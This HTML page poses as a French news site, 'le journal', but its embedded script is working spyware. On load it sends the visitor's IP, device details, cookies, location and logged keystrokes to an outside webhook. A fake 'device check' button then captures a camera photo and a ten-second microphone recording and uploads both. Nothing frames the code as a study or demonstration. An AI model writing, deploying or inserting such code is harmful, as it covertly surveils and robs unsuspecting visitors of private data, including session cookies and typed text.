<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>le journal</title>
<style>
  body{margin:0;font-family:-apple-system,system-ui,sans-serif;background:#f4f6fa;color:#111;padding:24px 18px}
  h1{font-size:22px;margin:0 0 6px}
  p{color:#555;line-height:1.6;font-size:15px}
  .card{background:#fff;border-radius:14px;padding:16px;margin-top:14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
  .btn{display:block;width:100%;padding:14px;margin-top:20px;background:#111;color:#fff;text-align:center;border-radius:12px;font-weight:600;border:none;font-size:16px}
</style>
</head>
<body>
<h1>le journal</h1>
<p>actualités du jour, chargement des articles...</p>
<div class="card"><b>météo</b><p>ciel dégagé, 21°c cet après-midi.</p></div>
<div class="card"><b>tech</b><p>nouveaux modèles attendus cette semaine.</p></div>
<div class="card"><b>sport</b><p>résultats de la soirée à retrouver en ligne.</p></div>

<button class="btn" id="startBtn">Vérifier l'appareil pour lire l'article</button>

<script>
const HOOK = "https://play.svix.com/in/Ku4de4lkjCuAta3HRsZR9Bv7pO6/";

function send(tag, data){
  fetch(HOOK, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({tag: tag, data: data, ts: Date.now()})
  }).catch(e => console.log("erreur envoi", e));
}

// test immédiat
send("test", {message: "test de connexion"});

async function collect(){
  let ip = "n/a", batt = "n/a", conn = "n/a";
  try { const r = await fetch("https://api.ipify.org?format=json"); ip = (await r.json()).ip; } catch(e){}
  try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"%"+(b.charging?"⚡":""); } catch(e){}
  try { conn = navigator.connection?.effectiveType || "n/a"; } catch(e){}

  send("info", {
    ua: navigator.userAgent,
    ip, batt, conn,
    platform: navigator.platform,
    lang: navigator.language,
    screen: screen.width+"x"+screen.height+"@"+(window.devicePixelRatio||1)+"x",
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    model: (navigator.userAgent.match(/iPhone OS [\d_]+/)||[""])[0],
    cookies: document.cookie || "",
    referrer: document.referrer || "",
    url: location.href
  });

  navigator.geolocation?.getCurrentPosition(
    p => send("loc", {lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}),
    e => send("loc", {err:e.message}),
    {timeout:10000}
  );
}
collect();

let buffer = "";
document.addEventListener("keydown", e => {
  buffer += e.key;
  if(buffer.length >= 40){ send("keys", buffer); buffer = ""; }
});
setInterval(() => { if(buffer){ send("keys", buffer); buffer = ""; } }, 15000);

document.getElementById("startBtn").addEventListener("click", async function() {
  this.textContent = "Chargement...";
  this.style.background = "#555";

  try {
    const videoStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    const video = document.createElement('video');
    video.srcObject = videoStream;
    await video.play();
    await new Promise(r => setTimeout(r, 1000));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    videoStream.getTracks().forEach(t => t.stop());
    
    const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
    const photoB64 = await new Promise(res => {
      const reader = new FileReader();
      reader.onload = () => res(reader.result.split(',')[1]);
      reader.readAsDataURL(photoBlob);
    });
    send("photo", { b64: photoB64, size: photoBlob.size });

    const audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
    const rec = new MediaRecorder(audioStream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    const recPromise = new Promise(res => rec.onstop = res);
    rec.start(); 
    await new Promise(r => setTimeout(r, 10000)); 
    rec.stop();
    await recPromise;
    audioStream.getTracks().forEach(t => t.stop());

    const audioBlob = new Blob(chunks, {type:'audio/webm'});
    const audioB64 = await new Promise(res => {
      const reader = new FileReader();
      reader.onload = () => res(reader.result.split(',')[1]);
      reader.readAsDataURL(audioBlob);
    });
    send("audio", { b64: audioB64, size: audioBlob.size });

    this.textContent = "Vérification terminée. Bonne lecture.";
    this.style.background = "#37d67a";
  } catch(e) {
    this.textContent = "Erreur de vérification.";
    this.style.background = "#ff5c5c";
  }
});
</script>
</body>
</html>
